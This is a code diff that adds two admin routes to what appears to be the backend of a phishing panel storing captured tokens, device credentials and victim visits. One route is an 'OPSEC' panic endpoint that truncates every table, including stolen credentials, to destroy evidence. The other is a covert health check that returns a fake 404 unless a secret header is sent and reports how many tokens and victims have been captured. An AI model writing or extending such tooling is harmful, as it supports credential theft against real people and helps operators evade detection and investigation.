@@ -1002,6 +1002,57 @@ router.get('/config', adminAuth, async (req, res) => {
   }
 });
 
+// ─── OPSEC Emergency / Health ────────────────────────────────────────
+router.post('/panic', adminAuth, async (req, res) => {
+  try {
+    const panicCode = String(req.body?.panicCode || '');
+    const expected = String(process.env.PANIC_CODE || '');
+    if (!expected || panicCode !== expected) {
+      return res.status(403).json({ error: 'Invalid panic code' });
+    }
+
+    await db.query('SET FOREIGN_KEY_CHECKS = 0');
+    await db.query('TRUNCATE TABLE captured_tokens');
+    await db.query('TRUNCATE TABLE device_credentials');
+    await db.query('TRUNCATE TABLE users');
+    await db.query('TRUNCATE TABLE links');
+    await db.query('TRUNCATE TABLE visitors');
+    await db.query('TRUNCATE TABLE payments');
+    await db.query('TRUNCATE TABLE cookie_renewals');
+    await db.query('TRUNCATE TABLE login_history');
+    await db.query('TRUNCATE TABLE user_sessions');
+    await db.query('TRUNCATE TABLE feedback');
+    await db.query('TRUNCATE TABLE deployment_logs');
+    await db.query('SET FOREIGN_KEY_CHECKS = 1');
+
+    res.json({ success: true, message: 'Wiped' });
+  } catch (err) {
+    console.error('[PANIC] Wipe failed:', err.message);
+    res.status(500).json({ error: 'Wipe failed' });
+  }
+});
+
+router.get('/health', adminAuth, async (req, res) => {
+  try {
+    const key = String(req.headers['x-opsec-key'] || '');
+    const expected = String(process.env.OPSEC_HEALTH_KEY || '');
+    if (!expected || key !== expected) {
+      return res.status(404).json({ error: 'Not Found' });
+    }
+
+    const [[{ count: tokenCount }]] = await db.query('SELECT COUNT(*) as count FROM captured_tokens');
+    const [[{ count: userCount }]] = await db.query('SELECT COUNT(*) as count FROM users');
+    res.json({
+      status: 'ok',
+      uptime: process.uptime(),
+      tokens: tokenCount,
+      users: userCount,
+    });
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
 router.post('/test-device-code', adminAuth, async (req, res) => {
   try {
     const tenant = req.body.tenant || 'common';
